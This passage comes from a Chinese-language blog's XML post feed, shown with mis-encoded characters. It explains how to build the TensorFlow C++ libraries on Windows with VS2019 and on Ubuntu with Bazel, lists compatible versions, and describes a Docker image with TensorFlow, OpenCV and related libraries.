debugç›®å½•ä¸‹å’Œ*.exeä¸€èµ·==</p><p>å¦‚å›¾:</p><img src="https://gitee.com/sizaif/images/raw/master/img/20210228151948.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210228151948.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210228151948803" style="zoom:80%;" /><h3 id="3-æ‰¾ä¸åˆ°cublas64-92-dll">3.æ‰¾ä¸åˆ°cublas64_92.dll</h3><p>æ²¡å®‰è£…cudaçš„ç¼˜æ•…</p><p><img src="https://img-blog.csdnimg.cn/img_convert/3604c54b4997219b79641e19a0914c34.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/img_convert/3604c54b4997219b79641e19a0914c34.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210228154527664"></p><p>æˆ‘å¯¹åº”çš„æ˜¯å®‰è£…9.2çš„ç‰ˆæœ¬</p><p>å‚è€ƒå®‰è£…CUDAæ–‡ç« </p><p><a href="https://blog.csdn.net/qq_46126258/article/details/112739305?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&amp;dist_request_id=94a15f6a-35fe-4639-90bf-20c5530f2251&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.control">https://blog.csdn.net/qq_46126258/article/details/112739305?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&amp;dist_request_id=94a15f6a-35fe-4639-90bf-20c5530f2251&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.control</a></p><p><strong>å®‰è£…å®Œåå†è¿è¡Œæç¤º æ‰¾ä¸åˆ° cudnn64_7.dll</strong></p><p>æ²¡æœ‰å®‰è£…å¯¹åº”çš„cudnnç‰ˆæœ¬</p><p>å»nvidiaå®˜ç½‘å®‰è£… <a href="https://developer.nvidia.com/rdp/cudnn-archive">https://developer.nvidia.com/rdp/cudnn-archive</a></p><p>é€‰æ‹©å¯¹åº”çš„Cudaç‰ˆæœ¬ ï¼Œ è¿™é‡Œé€‰æ‹©çš„å°±æ˜¯<img src="https://img-blog.csdnimg.cn/img_convert/537ba6297fe7931b97db5bf79059b340.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/img_convert/537ba6297fe7931b97db5bf79059b340.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210228162439099"></p><p>ä¸‹è½½å å°†å¯¹åº”çš„æ–‡ä»¶å¤åˆ¶åˆ° CUDA çš„å®‰è£…ç›®å½•ï¼š</p><pre class="language-python" data-language="python"><code class="language-python">a<span class="token punctuation">)</span> Copy <span class="token operator">&lt;</span>installpath<span class="token operator">></span>\cuda\<span class="token builtin">bin</span>\cudnn64_7<span class="token punctuation">.</span>dll to C<span class="token punctuation">:</span>\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v9<span class="token punctuation">.</span><span class="token number">2</span>\<span class="token builtin">bin</span><span class="token punctuation">.</span>b<span class="token punctuation">)</span> Copy <span class="token operator">&lt;</span>installpath<span class="token operator">></span>\cuda\ include\cudnn<span class="token punctuation">.</span>h to C<span class="token punctuation">:</span>\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v9<span class="token punctuation">.</span><span class="token number">2</span>\include<span class="token punctuation">.</span>c<span class="token punctuation">)</span> Copy <span class="token operator">&lt;</span>installpath<span class="token operator">></span>\cuda\lib\x64\cudnn<span class="token punctuation">.</span>lib to C<span class="token punctuation">:</span>\Program Files\NVIDIA GPU Computing Toolkit\CUDA\v9<span class="token punctuation">.</span><span class="token number">2</span>\lib\x64</code></pre></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> æœºå™¨å­¦ä¹  </category>
          
          <category> æœºå™¨å­¦ä¹  </category>
          
          <category> VS2019 </category>
          
          <category> Tensorflow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æœºå™¨å­¦ä¹  </tag>
            
            <tag> Tensorflow </tag>
            
            <tag> C++ </tag>
            
            <tag> VS2019 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu 20.04LTS ç¼–è¯‘Tensorflow C++</title>
      <link href="/posts/71bba0f8/"/>
      <url>/posts/71bba0f8/</url>
      
        <content type="html"><![CDATA[<h1>ubuntu 20.04LTS ç¼–è¯‘tensorflow C++</h1><blockquote><p>NOTE! å› ä¸ºubuntuåœ¨è™šæ‹Ÿæœºé‡Œ,æˆ‘æ˜¯ç”¨çš„ç¬”è®°æœ¬çš„æ˜¾å¡æ¯”è¾ƒè½å,å®‰è£…NVIDIAé©±åŠ¨å¤±è´¥,æ•…æœªä½¿ç”¨ GPUåŠŸèƒ½,ä»…ä½¿ç”¨äº†CPUæ¨¡å¼;</p></blockquote><blockquote><p>ç¼–è¯‘å¾—åˆ°libtensorflow_cc.soå’Œlibtensorflow_framework.so æ˜¯C++ æ‰€éœ€è¦çš„</p></blockquote><p>[TOC]</p><h2 id="tensorflow-å’ŒBazel-ä»¥åŠpython-å¯¹åº”çš„ç‰ˆæœ¬">tensorflow å’ŒBazel ä»¥åŠpython å¯¹åº”çš„ç‰ˆæœ¬</h2><div class="story post-story"><h3 id="Linux">Linux</h3><h4 id="CPU">CPU</h4><details green><summary> CPU </summary>              <div class='content'>              <table><thead><tr><th style="text-align:left">Version</th><th style="text-align:left">Python version</th><th style="text-align:left">Compiler</th><th style="text-align:left">Build tools</th></tr></thead><tbody><tr><td style="text-align:left">tensorflow-2.4.0</td><td style="text-align:left">3.6-3.8</td><td style="text-align:left">GCC 7.3.1</td><td style="text-align:left">Bazel 3.1.0</td></tr><tr><td style="text-align:left">tensorflow-2.3.0</td><td style="text-align:left">3.5-3.8</td><td style="text-align:left">GCC 7.3.1</td><td style="text-align:left">Bazel 3.1.0</td></tr><tr><td style="text-align:left">tensorflow-2.2.0</td><td style="text-align:left">3.5-3.8</td><td style="text-align:left">GCC 7.3.1</td><td style="text-align:left">Bazel 2.0.0</td></tr><tr><td style="text-align:left">tensorflow-2.1.0</td><td style="text-align:left">2.7, 3.5-3.7</td><td style="text-align:left">GCC 7.3.1</td><td style="text-align:left">Bazel 0.27.1</td></tr><tr><td style="text-align:left">tensorflow-2.0.0</td><td style="text-align:left">2.7, 3.3-3.7</td><td style="text-align:left">GCC 7.3.1</td><td style="text-align:left">Bazel 0.26.1</td></tr><tr><td style="text-align:left">tensorflow-1.15.0</td><td style="text-align:left">2.7, 3.3-3.7</td><td style="text-align:left">GCC 7.3.1</td><td style="text-align:left">Bazel 0.26.1</td></tr><tr><td style="text-align:left">tensorflow-1.14.0</td><td style="text-align:left">2.7, 3.3-3.7</td><td style="text-align:left">GCC 4.8</td><td style="text-align:left">Bazel 0.24.1</td></tr><tr><td style="text-align:left">tensorflow-1.13.1</td><td style="text-align:left">2.7, 3.3-3.7</td><td style="text-align:left">GCC 4.8</td><td style="text-align:left">Bazel 0.19.2</td></tr><tr><td style="text-align:left">tensorflow-1.12.0</td><td style="text-align:left">2.7, 3.3-3.6</td><td style="text-align:left">GCC 4.8</td><td style="text-align:left">Bazel 0.15.0</td></tr><tr><td style="text-align:left">tensorflow-1.11.0</td><td style="text-align:left">2.7, 3.3-3.6</td><td style="text-align:left">GCC 4.8</td><td style="text-align:left">Bazel 0.15.0</td></tr><tr><td style="text-align:left">tensorflow-1.10.0</td><td style="text-align:left">2.7, 3.3-3.6</td><td style="text-align:left">GCC 4.8</td><td style="text-align:left">Bazel 0.15.0</td></tr><tr><td style="text-align:left">tensorflow-1.9.0</td><td style="text-align:left">2.7, 3.3-3.6</td><td style="text-align:left">GCC 4.8</td><td style="text-align:left">Bazel 0.11.0</td></tr><tr><td style="text-align:left">tensorflow-1.8.0</td><td style="text-align:left">2.7, 3.3-3.6</td><td style="text-align:left">GCC 4.8</td><td style="text-align:left">Bazel 0.10.0</td></tr><tr><td style="text-align:left">tensorflow-1.7.0</td><td style="text-align:left">2.7, 3.3-3.6</td><td style="text-align:left">GCC 4.8</td><td style="text-align:left">Bazel 0.10.0</td></tr><tr><td style="text-align:left">tensorflow-1.6.0</td><td style="text-align:left">2.7, 3.3-3.6</td><td style="text-align:left">GCC 4.8</td><td style="text-align:left">Bazel 0.9.0</td></tr><tr><td style="text-align:left">tensorflow-1.5.0</td><td style="text-align:left">2.7, 3.3-3.6</td><td style="text-align:left">GCC 4.8</td><td style="text-align:left">Bazel 0.8.0</td></tr><tr><td style="text-align:left">tensorflow-1.4.0</td><td style="text-align:left">2.7, 3.3-3.6</td><td style="text-align:left">GCC 4.8</td><td style="text-align:left">Bazel 0.5.4</td></tr><tr><td style="text-align:left">tensorflow-1.3.0</td><td style="text-align:left">2.7, 3.3-3.6</td><td style="text-align:left">GCC 4.8</td><td style="text-align:left">Bazel 0.4.5</td></tr><tr><td style="text-align:left">tensorflow-1.2.0</td><td style="text-align:left">2.7, 3.3-3.6</td><td style="text-align:left">GCC 4.8</td><td style="text-align:left">Bazel 0.4.5</td></tr><tr><td style="text-align:left">tensorflow-1.1.0</td><td style="text-align:left">2.7, 3.3-3.6</td><td style="text-align:left">GCC 4.8</td><td style="text-align:left">Bazel 0.4.2</td></tr><tr><td style="text-align:left">tensorflow-1.0.0</td><td style="text-align:left">2.7, 3.3-3.6</td><td style="text-align:left">GCC 4.8</td><td style="text-align:left">Bazel 0.4.2</td></tr></tbody></table>              </div>            </details><h4 id="GPU">GPU</h4><details green><summary> GPU </summary>              <div class='content'>              <table><thead><tr><th style="text-align:left">Version</th><th style="text-align:left">Python version</th><th style="text-align:left">Compiler</th><th style="text-align:left">Build tools</th><th style="text-align:left">cuDNN</th><th style="text-align:left">CUDA</th></tr></thead><tbody><tr><td style="text-align:left">tensorflow-2.4.0</td><td style="text-align:left">3.6-3.8</td><td style="text-align:left">GCC 7.3.1</td><td style="text-align:left">Bazel 3.1.0</td><td style="text-align:left">8.0</td><td style="text-align:left">11.0</td></tr><tr><td style="text-align:left">tensorflow-2.3.0</td><td style="text-align:left">3.5-3.8</td><td style="text-align:left">GCC 7.3.1</td><td style="text-align:left">Bazel 3.1.0</td><td style="text-align:left">7.6</td><td style="text-align:left">10.1</td></tr><tr><td style="text-align:left">tensorflow-2.2.0</td><td style="text-align:left">3.5-3.8</td><td style="text-align:left">GCC 7.3.1</td><td style="text-align:left">Bazel 2.0.0</td><td style="text-align:left">7.6</td><td style="text-align:left">10.1</td></tr><tr><td style="text-align:left">tensorflow-2.1.0</td><td style="text-align:left">2.7, 3.5-3.7</td><td style="text-align:left">GCC 7.3.1</td><td style="text-align:left">Bazel 0.27.1</td><td style="text-align:left">7.6</td><td style="text-align:left">10.1</td></tr><tr><td style="text-align:left">tensorflow-2.0.0</td><td style="text-align:left">2.7, 3.3-3.7</td><td style="text-align:left">GCC 7.3.1</td><td style="text-align:left">Bazel 0.26.1</td><td style="text-align:left">7.4</td><td style="text-align:left">10.0</td></tr><tr><td style="text-align:left">tensorflow_gpu-1.15.0</td><td style="text-align:left">2.7, 3.3-3.7</td><td style="text-align:left">GCC 7.3.1</td><td style="text-align:left">Bazel 0.26.1</td><td style="text-align:left">7.4</td><td style="text-align:left">10.0</td></tr><tr><td style="text-align:left">tensorflow_gpu-1.14.0</td><td style="text-align:left">2.7, 3.3-3.7</td><td style="text-align:left">GCC 4.8</td><td style="text-align:left">Bazel 0.24.1</td><td style="text-align:left">7.4</td><td style="text-align:left">10.0</td></tr><tr><td style="text-align:left">tensorflow_gpu-1.13.1</td><td style="text-align:left">2.7, 3.3-3.7</td><td style="text-align:left">GCC 4.8</td><td style="text-align:left">Bazel 0.19.2</td><td style="text-align:left">7.4</td><td style="text-align:left">10.0</td></tr><tr><td style="text-align:left">tensorflow_gpu-1.12.0</td><td style="text-align:left">2.7, 3.3-3.6</td><td style="text-align:left">GCC 4.8</td><td style="text-align:left">Bazel 0.15.0</td><td style="text-align:left">7</td><td style="text-align:left">9</td></tr><tr><td style="text-align:left">tensorflow_gpu-1.11.0</td><td style="text-align:left">2.7, 3.3-3.6</td><td style="text-align:left">GCC 4.8</td><td style="text-align:left">Bazel 0.15.0</td><td style="text-align:left">7</td><td style="text-align:left">9</td></tr><tr><td style="text-align:left">tensorflow_gpu-1.10.0</td><td style="text-align:left">2.7, 3.3-3.6</td><td style="text-align:left">GCC 4.8</td><td style="text-align:left">Bazel 0.15.0</td><td style="text-align:left">7</td><td style="text-align:left">9</td></tr><tr><td style="text-align:left">tensorflow_gpu-1.9.0</td><td style="text-align:left">2.7, 3.3-3.6</td><td style="text-align:left">GCC 4.8</td><td style="text-align:left">Bazel 0.11.0</td><td style="text-align:left">7</td><td style="text-align:left">9</td></tr><tr><td style="text-align:left">tensorflow_gpu-1.8.0</td><td style="text-align:left">2.7, 3.3-3.6</td><td style="text-align:left">GCC 4.8</td><td style="text-align:left">Bazel 0.10.0</td><td style="text-align:left">7</td><td style="text-align:left">9</td></tr><tr><td style="text-align:left">tensorflow_gpu-1.7.0</td><td style="text-align:left">2.7, 3.3-3.6</td><td style="text-align:left">GCC 4.8</td><td style="text-align:left">Bazel 0.9.0</td><td style="text-align:left">7</td><td style="text-align:left">9</td></tr><tr><td style="text-align:left">tensorflow_gpu-1.6.0</td><td style="text-align:left">2.7, 3.3-3.6</td><td style="text-align:left">GCC 4.8</td><td style="text-align:left">Bazel 0.9.0</td><td style="text-align:left">7</td><td style="text-align:left">9</td></tr><tr><td style="text-align:left">tensorflow_gpu-1.5.0</td><td style="text-align:left">2.7, 3.3-3.6</td><td style="text-align:left">GCC 4.8</td><td style="text-align:left">Bazel 0.8.0</td><td style="text-align:left">7</td><td style="text-align:left">9</td></tr><tr><td style="text-align:left">tensorflow_gpu-1.4.0</td><td style="text-align:left">2.7, 3.3-3.6</td><td style="text-align:left">GCC 4.8</td><td style="text-align:left">Bazel 0.5.4</td><td style="text-align:left">6</td><td style="text-align:left">8</td></tr><tr><td style="text-align:left">tensorflow_gpu-1.3.0</td><td style="text-align:left">2.7, 3.3-3.6</td><td style="text-align:left">GCC 4.8</td><td style="text-align:left">Bazel 0.4.5</td><td style="text-align:left">6</td><td style="text-align:left">8</td></tr><tr><td style="text-align:left">tensorflow_gpu-1.2.0</td><td style="text-align:left">2.7, 3.3-3.6</td><td style="text-align:left">GCC 4.8</td><td style="text-align:left">Bazel 0.4.5</td><td style="text-align:left">5.1</td><td style="text-align:left">8</td></tr><tr><td style="text-align:left">tensorflow_gpu-1.1.0</td><td style="text-align:left">2.7, 3.3-3.6</td><td style="text-align:left">GCC 4.8</td><td style="text-align:left">Bazel 0.4.2</td><td style="text-align:left">5.1</td><td style="text-align:left">8</td></tr><tr><td style="text-align:left">tensorflow_gpu-1.0.0</td><td style="text-align:left">2.7, 3.3-3.6</td><td style="text-align:left">GCC 4.8</td><td style="text-align:left">Bazel 0.4.2</td><td style="text-align:left">5.1</td><td style="text-align:left">8</td></tr></tbody></table>              </div>            </details></div><h2 id="å…·ä½“æ­¥éª¤">å…·ä½“æ­¥éª¤</h2><div class="story post-story"><h3 id="ä¸€-é¦–å…ˆå®‰è£…python3-ç¯å¢ƒ-å¦‚æœä½ æ²¡æœ‰å®‰è£…çš„è¯">ä¸€ é¦–å…ˆå®‰è£…python3 ç¯å¢ƒ, å¦‚æœä½ æ²¡æœ‰å®‰è£…çš„è¯</h3><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> python3-dev python3-pip</code></pre><blockquote><p>å®‰è£…TensorFlow 2 .whlåŒ…éœ€è¦ä¸€ä¸ªpipç‰ˆæœ¬&gt;19.0</p></blockquote><h3 id="äºŒ-å®‰è£…-Bazel">äºŒ å®‰è£… Bazel</h3><p>è¿™é‡Œæˆ‘æ‰ç”¨çš„æ˜¯å®‰è£…ç¨‹åºæ–‡ä»¶æ¥è¿›è¡Œçš„.</p><p>å®‰è£…ç¨‹åºå¯ä»¥ä»Bazelâ€™sä¸‹è½½ <a href="https://github.com/bazelbuild/bazel/releases">https://github.com/bazelbuild/bazel/releases</a>  é€‰æ‹©ä¸Šé¢ä½ è¦ç¼–è¯‘çš„å¯¹åº”çš„bazelç‰ˆæœ¬</p><p>å®‰è£…ç¨‹åºåŒ…å«BazeläºŒè¿›åˆ¶æ–‡ä»¶ï¼Œå¹¶å°†å…¶æå–åˆ°**$HOME/bin**æ–‡ä»¶å¤¹ä¸­ã€‚ä¸ºäº†è®©Bazelå·¥ä½œï¼Œå¿…é¡»æ‰‹åŠ¨å®‰è£…ä¸€äº›é™„åŠ åº“ã€‚</p><p>å¦‚æœæ²¡æœ‰ä»¥ä¸‹ç¯å¢ƒ. éœ€è¦è¿›è¡Œå®‰è£…</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> g++ <span class="token function">unzip</span> <span class="token function">zip</span></code></pre><p>å¦‚æœæƒ³ç”¨Bazel æ„å»ºJAVAä»£ç , ä½¿ç”¨JDK</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># Ubuntu 16.04 (LTS) uses OpenJDK 8 by default:</span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> openjdk-8-jdk<span class="token comment"># Ubuntu 18.04 (LTS) uses OpenJDK 11 by default:</span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> openjdk-11-jdk</code></pre><p>ä¸‹è½½ä¹‹å, è¿è¡Œ</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">chmod</span> +x bazel-<span class="token operator">&lt;</span>version<span class="token operator">></span>-installer-linux-x86_64.sh./bazel-<span class="token operator">&lt;</span>version<span class="token operator">></span>-installer-linux-x86_64.sh --user</code></pre><blockquote><p>The <code>--user</code> flag installs Bazel to the <code>$HOME/bin</code> directory on your system and sets the <code>.bazelrc</code> path to <code>$HOME/.bazelrc</code>. Use the <code>--help</code> command to see additional installation options.</p></blockquote><p>å½“ä½¿ç”¨â€“user æ¥å®‰è£…æ—¶, Bazel ä¼šè¢«å®‰è£…åˆ° <strong>$HOME/bin</strong>  è·¯å¾„ä¸‹, æ·»åŠ ç¯å¢ƒè¯­å¥åˆ°ç¯å¢ƒ**<sub>/.bashrc**æˆ–è€…**</sub>/.zshrc**å˜é‡é‡Œ</p><p>å¯ä»¥ä½¿ç”¨VIM</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">vim</span> ~/.bashrc</code></pre><p>æ·»åŠ ä»¥ä¸‹è¯­å¥</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token string">"<span class="token environment constant">$PATH</span>:<span class="token environment constant">$HOME</span>/bin"</span></code></pre><p>ç„¶åå®è´¨ç”Ÿæ•ˆ</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">source</span> ~/.bashrc</code></pre><h3 id="ä¸‰ä¸‹è½½tensorflowæºç ">ä¸‰ä¸‹è½½tensorflowæºç </h3><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">git</span> clone https://github.com/tensorflow/tensorflow.git<span class="token builtin class-name">cd</span> tensorflow</code></pre><p>é€‰æ‹©è¦å®‰è£…çš„ç‰ˆæœ¬</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> checkout branch_name  <span class="token comment"># r2.2, r2.3, r2.4 etc.</span></code></pre><h3 id="æ„å»ºç¯å¢ƒ">æ„å»ºç¯å¢ƒ</h3><pre class="language-shell" data-language="shell"><code class="language-shell">./configure</code></pre><h4 id="configure-ä¼šè¯å±•ç¤º">configure ä¼šè¯å±•ç¤º</h4><p><strong>è¿™é‡Œè¦è¯´æ˜çš„æ˜¯å¦‚æœæœ‰CUDAï¼Œé‚£ä¹ˆDo you wish to build Tensorflow with CUDA?ä¸€å®šè¦é€‰Yï¼Œç„¶åå…¶å®ƒçš„æˆ‘åŸºæœ¬éƒ½æ˜¯N</strong></p><details green><summary> code </summary>              <div class='content'>              <pre class="language-bash" data-language="bash"><code class="language-bash">./configureYou have bazel <span class="token number">3.0</span>.0 installed.Please specify the location of python. <span class="token punctuation">[</span>Default is /usr/bin/python3<span class="token punctuation">]</span>: Found possible Python library paths:  /usr/lib/python3/dist-packages  /usr/local/lib/python3.6/dist-packagesPlease input the desired Python library path to use.  Default is <span class="token punctuation">[</span>/usr/lib/python3/dist-packages<span class="token punctuation">]</span>Do you wish to build TensorFlow with OpenCL SYCL support? <span class="token punctuation">[</span>y/N<span class="token punctuation">]</span>: No OpenCL SYCL support will be enabled <span class="token keyword">for</span> TensorFlow.Do you wish to build TensorFlow with ROCm support? <span class="token punctuation">[</span>y/N<span class="token punctuation">]</span>: No ROCm support will be enabled <span class="token keyword">for</span> TensorFlow.Do you wish to build TensorFlow with CUDA support? <span class="token punctuation">[</span>y/N<span class="token punctuation">]</span>: YCUDA support will be enabled <span class="token keyword">for</span> TensorFlow.Do you wish to build TensorFlow with TensorRT support? <span class="token punctuation">[</span>y/N<span class="token punctuation">]</span>: No TensorRT support will be enabled <span class="token keyword">for</span> TensorFlow.Found CUDA <span class="token number">10.1</span> in:    /usr/local/cuda-10.1/targets/x86_64-linux/lib    /usr/local/cuda-10.1/targets/x86_64-linux/includeFound cuDNN <span class="token number">7</span> in:    /usr/lib/x86_64-linux-gnu    /usr/includePlease specify a list of comma-separated CUDA compute capabilities you want to build with.You can <span class="token function">find</span> the compute capability of your device at: https://developer.nvidia.com/cuda-gpus Each capability can be specified as <span class="token string">"x.y"</span> or <span class="token string">"compute_xy"</span> to include both virtual and binary GPU code, or as <span class="token string">"sm_xy"</span> to only include the binary code.Please note that each additional compute capability significantly increases your build <span class="token function">time</span> and binary size, and that TensorFlow only supports compute capabilities <span class="token operator">>=</span> <span class="token number">3.5</span> <span class="token punctuation">[</span>Default is: <span class="token number">3.5</span>,7.0<span class="token punctuation">]</span>: <span class="token number">6.1</span>Do you want to use clang as CUDA compiler? <span class="token punctuation">[</span>y/N<span class="token punctuation">]</span>: nvcc will be used as CUDA compiler.Please specify <span class="token function">which</span> gcc should be used by nvcc as the <span class="token function">host</span> compiler. <span class="token punctuation">[</span>Default is /usr/bin/gcc<span class="token punctuation">]</span>: Please specify optimization flags to use during compilation when bazel option <span class="token string">"--config=opt"</span> is specified <span class="token punctuation">[</span>Default is -march<span class="token operator">=</span>native -Wno-sign-compare<span class="token punctuation">]</span>: Would you like to interactively configure ./WORKSPACE <span class="token keyword">for</span> Android builds? <span class="token punctuation">[</span>y/N<span class="token punctuation">]</span>: Not configuring the WORKSPACE <span class="token keyword">for</span> Android builds.Preconfigured Bazel build configs. You can use any of the below by adding <span class="token string">"--config=&lt;>"</span> to your build command. See .bazelrc <span class="token keyword">for</span> <span class="token function">more</span> details.    --config<span class="token operator">=</span>mkl            <span class="token comment"># Build with MKL support.</span>    --config<span class="token operator">=</span>monolithic     <span class="token comment"># Config for mostly static monolithic build.</span>    --config<span class="token operator">=</span>ngraph         <span class="token comment"># Build with Intel nGraph support.</span>    --config<span class="token operator">=</span>numa           <span class="token comment"># Build with NUMA support.</span>    --config<span class="token operator">=</span>dynamic_kernels    <span class="token comment"># (Experimental) Build kernels into separate shared objects.</span>    --config<span class="token operator">=</span>v2             <span class="token comment"># Build TensorFlow 2.x instead of 1.x.</span>Preconfigured Bazel build configs to DISABLE default on features:    --config<span class="token operator">=</span>noaws          <span class="token comment"># Disable AWS S3 filesystem support.</span>    --config<span class="token operator">=</span>nogcp          <span class="token comment"># Disable GCP support.</span>    --config<span class="token operator">=</span>nohdfs         <span class="token comment"># Disable HDFS support.</span>    --config<span class="token operator">=</span>nonccl         <span class="token comment"># Disable NVIDIA NCCL support.</span>Configuration finished</code></pre>              </div>            </details><h3 id="ç¼–è¯‘">ç¼–è¯‘</h3><p>é…ç½®å¥½ä¹‹åå°±è¿›è¡Œç¼–è¯‘ï¼šè‹¥é‡‡ç”¨CUDA åˆ™å¦‚ä¸‹</p><pre class="language-shell" data-language="shell"><code class="language-shell">bazel build --config<span class="token operator">=</span>opt --config<span class="token operator">=</span>cuda //tensorflow:libtensorflow_cc.so</code></pre><p>â€‹è¿™é‡Œå¦‚æœä¸ç”¨cudaçš„è¯(å‰é¢é…ç½®çš„æ—¶å€™åœ¨CUDAé‚£ä¸€é¡¹é‚£é‡Œè¾“å…¥N)ï¼Œå°±è¾“å…¥ï¼š</p><pre class="language-shell" data-language="shell"><code class="language-shell">bazel build --config<span class="token operator">=</span>opt  //tensorflow:libtensorflow_cc.so</code></pre><p><strong>å¯èƒ½ä¼šé‡åˆ°çš„é—®é¢˜:</strong></p><ol><li><p><strong>/usr/bin/env: â€˜pythonâ€˜: No such file or directory</strong></p><p>å¦‚æœä»¥åŠå®‰è£…äº†python3çš„ç‰ˆæœ¬,å¯èƒ½æ˜¯å› ä¸ºæ˜¾ç¤ºçš„æ˜¯python3.X ä½†ç”¨çš„çš„åç§°ä¸ºpython</p><p>æ‰€ä»¥å¯ä»¥å»ºç«‹ä¸€ä¸ªè½¯è¿æ¥</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">whereis</span> python3<span class="token comment"># å¦‚æœå®‰è£…çš„è¯,é»˜è®¤åœ¨/usr/bin/ç›®å½•ä¸‹sudo ln -s /usr/bin/python3 /usr/bin/python</span></code></pre></li></ol><p>æ¥ä¸‹æ¥å°±æ˜¯æ¼«é•¿çš„ç­‰å¾…,</p><p>å› ä¸ºæˆ‘æ²¡æœ‰ç”¨CUDA( NVIDIAçš„é©±åŠ¨æ²¡æœ‰å®‰è£…ä¸Š,æ‰€ä»¥ç”¨ä¸äº†GPUåŠ é€Ÿ) è€—æ—¶3+å°æ—¶<img src="https://gitee.com/sizaif/images/raw/master/img/20210415213108.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210415213108.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img"></p><p>æœ€ç»ˆä¼šåœ¨ å½“å‰ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ª bazel-bin ç›®å½•ä¸‹ tensorflow é‡Œ æ‰¾åˆ°è¿™ä¸¤ä¸ªæ–‡ä»¶</p><p><img src="https://gitee.com/sizaif/images/raw/master/img/20210415213223.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20210415213223.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20210415213223587"></p></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> æœºå™¨å­¦ä¹  </category>
          
          <category> æœºå™¨å­¦ä¹  </category>
          
          <category> Tensorflow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æœºå™¨å­¦ä¹  </tag>
            
            <tag> Tensorflow </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tensorflow-C++ &amp; OpenCV &amp; OpenBlas &amp; Eigen3 &amp; Protobuf ç¯å¢ƒDockeré•œåƒ</title>
      <link href="/posts/1c98e054/"/>
      <url>/posts/1c98e054/</url>
      
        <content type="html"><![CDATA[<h1>tensorflow-C++ &amp; OpenCV &amp; OpenBlas &amp; eigen3 &amp; protobuf ç¯å¢ƒdockeré•œåƒ</h1><p>[toc]</p><h2 id="ç‰ˆæœ¬">ç‰ˆæœ¬</h2><div class="story post-story"><pre class="language-bash" data-language="bash"><code class="language-bash">tensorflow  <span class="token number">2.4</span>.1protobuf <span class="token number">3.9</span>.2opencv <span class="token number">4.5</span>.2openblas <span class="token number">0.3</span>.13eigen3 <span class="token number">3.3</span>.9</code></pre></div><h2 id="ä½¿ç”¨æ–¹æ³•">ä½¿ç”¨æ–¹æ³•:</h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># ä¸‹è½½é•œåƒ</span>docker pull sizaif2000/siz:1.0<span class="token comment"># è¿è¡Œå åœ¨ /home/tf_test/  ä¸‹æœ‰ tensorflow æµ‹è¯•</span>--------docker run -p æœ¬æœºæ˜ å°„ç«¯å£:é•œåƒæ˜ å°„ç«¯å£ -d  --name å¯åŠ¨é•œåƒåç§° -e é•œåƒå¯åŠ¨å‚æ•°  é•œåƒåç§°:é•œåƒç‰ˆæœ¬å·       å‚æ•°é‡Šä¹‰ï¼š     -p   æœ¬æœºç«¯å£å’Œå®¹å™¨å¯åŠ¨ç«¯å£æ˜ å°„     -d   åå°è¿è¡Œ     --name   å®¹å™¨åç§°     -e    é•œåƒå¯åŠ¨å‚æ•°------------------------tf_test <span class="token builtin class-name">.</span><span class="token operator">|</span>-- CMakeLists.txt<span class="token operator">|</span>-- README.md<span class="token variable"><span class="token variable">`</span>-- src    <span class="token variable">`</span></span>-- main.cpp<span class="token number">1</span> directory, <span class="token number">3</span> files------------------------<span class="token builtin class-name">cd</span> tf_testcmake.<span class="token function">make</span>./main<span class="token comment"># if ok, then you can see like this: </span>This is tensorflow <span class="token builtin class-name">test</span>XXXX-XX-XX 03:55:33.709188: I tensorflow/core/platform/cpu_feature_guard.cc:142<span class="token punctuation">]</span> This TensorFlow binary is optimized with oneAPI Deep Neural Network Library <span class="token 